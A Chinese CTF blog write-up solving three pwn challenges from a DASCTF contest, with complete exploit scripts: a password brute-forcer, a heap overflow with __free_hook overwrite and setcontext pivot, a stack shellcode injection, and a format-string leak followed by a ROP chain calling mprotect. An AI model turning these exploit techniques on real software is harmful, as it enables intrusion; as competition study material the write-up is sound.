# DASCTF-Sept-X-浙江工业大学秋季挑战赛-pwn-wp



### 总结

`10:30`才起床做题......`pwn`是三道简单题，`datasystem`拿了个一血。`hahapwn`的远程靶机有问题，远程交互时惊现`flag{flag_test}`。我沉思片刻，随即怀着忐忑的心情点了提交，然而这个`flag`并不正确，有点迷。

- `datasystem`: 堆溢出 + `setcontext`
- `hehepwn`：`shellcode`
- `hahapwn`：格式化字符串+栈溢出

<!-- more -->

### datasystem

保护全开

![image-20210925153451706](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210925153451706.png)

系统调用禁得很佛系，`arch`也没检查，系统调用号范围也没检查：

![image-20210925153716160](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210925153716160.png)

给的`libc`版本是`2.27`，有`tcache`。

#### check分析

一进来有个`check`函数，要求输入`username`和`passwd`：

![image-20210925153855114](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210925153855114.png)

最后需要通过校验：

![image-20210925154021784](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210925154021784.png)

从上图也能看出`username`的校验是判断等不等于`admin`，这里循环次数是`6`，所以输入的时候后面带个`\x00`才能通过`username`的校验。

`passwd`有点复杂，不过可以直接用`ida`远程调试，查看一下比较`s1`和`s2`的时候，其值为多少。先随便输入密码，比如我先输入为`passwd`为`admin123`，发现`s2`是一个`16`进制字符串：

![image-20210925154530033](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210925154530033.png)

![image-20210925154848046](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210925154848046.png)

`s1`还看不出什么。然后我直接拷贝了`s2`作为密码输入：

![image-20210925154933098](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210925154933098.png)

然后发现`s2`的第`1`个字符变成了`\x00`：

![image-20210925155018438](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210925155018438.png)

之后换别的密码，但是`s2`第一个字符始终不是`\x00`。这个时候，我猜测是不是密码的长度要为`32`。于是分别输入`32`个`a`和`32`个`b`，发现`s2`的第一个字符始终为`\x00`。

有这么一个规律后，接下来可以爆破`passwd`了，就是枚举爆破直到某次密码得到的`s1`开头也是`\x00`，那么`strcmp`就能通过比较：

- 枚举所有的字符
- 输入`32`个同样的字符作为密码，判断是否通过校验
- 通过校验即可以作为有效的密码

爆破的脚本如下：

```python
import string
from pwn import *
context.log_level="error"
for c in range(0x100):
    c = c.to_bytes(1, 'big')
    p = process('./datasystem')
    p.sendafter("please input username: ", "admin\x00")
    p.sendafter("please input password: ", c*32)
    msg = p.recvline()
    if b"Fail" not in msg:
        print('='*60)
        print("a valid char:", c)
        print('='*60)
    p.close()
```

最后得到两个可以用的密码：

![image-20210925160351278](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210925160351278.png)

对`check`的分析即可告一段落，之后就是常规的堆溢出的题。

#### 漏洞点

在`add`分支，输入内容的时候，存在堆溢出，这的`size`总是`0x506`：

![image-20210925160727986](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210925160727986.png)

也可以用`gdb`看一把：

![image-20210925160934214](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210925160934214.png)



#### 利用思路

- 构造一个`unsorted bin`
- 利用`chunk`中`fd`与`bk`残留的的地址泄露出`libc`地址
- 利用堆溢出覆盖`free chunk`的`fd`为`__free_hook - 0x200`地址
- 分配到`__free_hook - 0x200`处，覆盖`__free_hook`为`setcontext+53`
- 利用程序`mmap`的`0x23330000`这一段`rwx`内存执行`shellcode`

#### exp

```python
#!/usr/bin/python3
from pwncli import *

cli_script()

p:tube = gift['io']
elf:ELF = gift['elf']
libc: ELF = gift['libc']

def login():
    p.sendafter("please input username: ", "admin\x00")
    p.sendafter("please input password: ", "c"*32)


def add(size, data="a\n"):
    p.sendlineafter(">> :\n", "1")
    p.sendlineafter("Size: \n", str(size))
    p.sendafter("what's your Content: \n", data)


def delete(idx):
    p.sendlineafter(">> :\n", "2")
    p.sendlineafter("Index:\n", str(idx))

def show(idx):
    p.sendlineafter(">> :\n", "3")
    p.sendlineafter("Index:\n", str(idx))
    m = p.recvline()
    info(f"Get info:{m}")
    return m

def edit(idx, data):
    p.sendlineafter(">> :\n", "4")
    p.sendlineafter("Index:\n", str(idx))
    p.sendafter("Content:\n", data)

login()

add(0x420)
add(0x10) # 1

# get unsorted bin 
delete(0)

# leak libc addr
add(0x8, "a"*8)
edit(0, "a"*8)

m = show(0)
libc_base_addr = u64_ex(m[0x11:0x17])- 0x3ec090
log_libc_base_addr(libc_base_addr) 
libc.address = libc_base_addr

# overflow write
add(0x20) # 2
delete(2)
delete(0)
add(0x10, flat({0x10:[0, 0x311, libc.sym['__free_hook']-0x200]}))

add(0x20)

# setcontext to exec shellcode 
payload = flat({
    0x200:libc.sym['setcontext']+53,
    0x100: 0x23330000, # rsp
    0xa0: libc.sym['__free_hook']-0x100 ,# rsp
    0x68: 0, # rdi
    0x70: 0x23330000, # rsi
    0x88: 0x200,
    0xa8: libc.sym['read'] # rcx
}, filler="\x00")
add(0x20, payload)

delete(3)

sleep(1)

p.sendline(asm(shellcraft.cat("/flag")))

p.interactive()
```

远程打：

![image-20210925161955747](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210925161955747.png)

### hehepwn

什么保护都没有，白给

![image-20210925152001285](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210925152001285.png)

#### 漏洞点

填满`0x20`个字符后可泄露栈地址：

![image-20210925151910507](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210925151910507.png)

栈溢出：

![image-20210925152030008](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210925152030008.png)

#### exp

```python
#!/usr/bin/python3
from pwncli import *

cli_script()

p:tube = gift['io']

p.sendafter("well you input:\n", "a"*0x20)
m = p.recvuntil("\x7f")

addr = u64_ex(m[-6:])
log_address("stack addr", addr)

p.sendlineafter("EASY PWN PWN PWN~\n", flat({0:asm(shellcraft.cat('/flag')), 0x58: addr - 0x50}))

p.interactive()
```

远程打：

![image-20210925162147990](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210925162147990.png)

### hahapwn

开启了`NX`和`Canary`，给的`libc`版本是`2.23`的：

![image-20210925152254158](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210925152254158.png)

强行禁用了`execve`：

![image-20210925152426536](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210925152426536.png)

#### 漏洞点

格式化字符串和栈溢出：

![image-20210925152501752](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210925152501752.png)

远程靶机很诡异啊，泄露出地址后，我用`libc.sym['read']`执行`read`会失败，但是用二进制文件的`read@plt`可以成功，还有`pop rdx; pop rsi; ret`远程也会失败，就很迷。后来改了下`gadgets`，然后喜提`test flag`：

![image-20210925152821175](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210925152821175.png)

#### exp

```python
#!/usr/bin/python3
from pwncli import *

cli_script()

p:tube = gift['io']
libc: ELF = gift['libc']

# offset 6
p.sendafter("Welcome! What is your name?\n", "%25$p,%27$p,%28$p")
m = p.recvline_startswith('0x')
log_ex(f"{m}")
leak_addr = int16(m[:14].decode()) - 324 - libc.sym['setvbuf']
log_libc_base_addr(leak_addr)
libc.address = leak_addr

canary = int16(m[15:33].decode())
log_address("canary", canary)

stack_addr = int16(m[34:48].decode())
log_address("stack", stack_addr)
start_addr = stack_addr - 0xc0

bss_addr = 0x601080
read_addr = 0x4005e0
puts_addr = 0x4005b0

libc_rdi_ret = leak_addr + 0x0000000000021112
libc_rdx_ret = leak_addr + 0x0000000000001b92
libc_rsi_ret = leak_addr + 0x00000000000202f8
libc_rax_ret = leak_addr + 0x000000000003a738
libc_syscall_ret = leak_addr + 0x00000000000bc3f5

payload = flat([
    0x68*"a",
    canary,
    0, 
    libc_rdi_ret, 0,
    libc_rsi_ret, bss_addr,
    libc_rdx_ret, 800,
    read_addr,
    libc_rdi_ret, bss_addr,
    puts_addr,
    libc_rdi_ret, bss_addr &~0xfff,
    libc_rsi_ret, 0x1000,
    libc_rdx_ret, 7,
    libc_rax_ret, SyscallNumber.amd64.MPROTECT,
    libc_syscall_ret,
    bss_addr
], filler="\x00", length=0x200)

p.sendafter("What can we help you?\n", payload)

p.send(asm(shellcraft.cat('/flag')))

flag_ = p.recvline_startswith("flag")

log_ex(f"Get flag: {flag_}")

p.interactive()
```

`exp`均使用我自己写的小工具`pwncli`编写，欢迎试用~

### 其他链接
1、[My Blog](https://roderickchan.github.io)

2、[Ctf Wiki](https://ctf-wiki.org/)

3、[pwncli](https://github.com/RoderickChan/pwncli)



---

> 作者: [roderick](https://www.roderickchan.cn)  
> URL: https://roderickchan.github.io/zh-cn/2021-09-25-dasctf-sept-x-%E6%B5%99%E6%B1%9F%E5%B7%A5%E4%B8%9A%E5%A4%A7%E5%AD%A6%E7%A7%8B%E5%AD%A3%E6%8C%91%E6%88%98%E8%B5%9B-pwn-wp/  

